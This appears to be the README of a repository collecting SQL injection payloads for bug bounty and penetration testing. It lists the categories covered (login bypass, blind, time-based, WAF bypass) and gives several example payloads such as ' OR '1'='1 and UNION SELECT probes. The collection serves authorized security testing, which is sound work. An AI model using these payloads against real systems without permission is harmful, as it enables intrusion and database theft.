# SQLi_Payload
A curated, tested, and Burp-ready collection of SQL Injection payloads — including classic, blind, error-based, time-based, login bypasses, and WAF bypass techniques. Made for bug bounty hunters and penetration testers.


💣 SQL Injection Payload Collection
Welcome, bug hunters 👋
This repository contains a carefully curated and battle-tested list of SQL Injection (SQLi) payloads for use in bug bounty hunting, CTFs, penetration testing, and security research.

Each payload is organized by injection type and database system, with a focus on real-world usability and Burp Suite–friendly formatting.

🧠 Whether you're bypassing login forms, dumping databases, or poking blind time-based logic — this list is here to save your time and increase your hits.

📦 What's Inside
✔️ Ready-to-use SQLi payloads categorized by:

✅ Classic Injection

🧪 Error-Based Injection

👁️‍🗨️ Blind Injection (Boolean-Based)

⏳ Time-Based Blind Injection

🔐 Login Bypass Payloads

🚫 WAF/Filter Bypass Techniques

🗃️ DBMS-Specific Payloads:

MySQL

MSSQL

Oracle

PostgreSQL

🛠️ Union Injection Tricks

🔄 Encoding and Obfuscation

🧩 Comment-based injections, logical bypasses, NULLs, etc.

🚀 How to Use
Paste directly into Burp Suite Intruder or Repeater

Use in automated scripts or recon tools

Filter and adapt based on context (headers, POST, GET, cookies)

Always test in legal or authorized environments

🔥 Example Payloads
Here’s a sneak peek:

' OR '1'='1

1' AND SLEEP(5)--+

admin'--

' UNION SELECT NULL,NULL--

1);WAITFOR DELAY '0:0:5'--

' OR 1=1 LIMIT 1 OFFSET 1--

//UNION//ALL//SELECT//NULL--

Find more inside the full list 💥
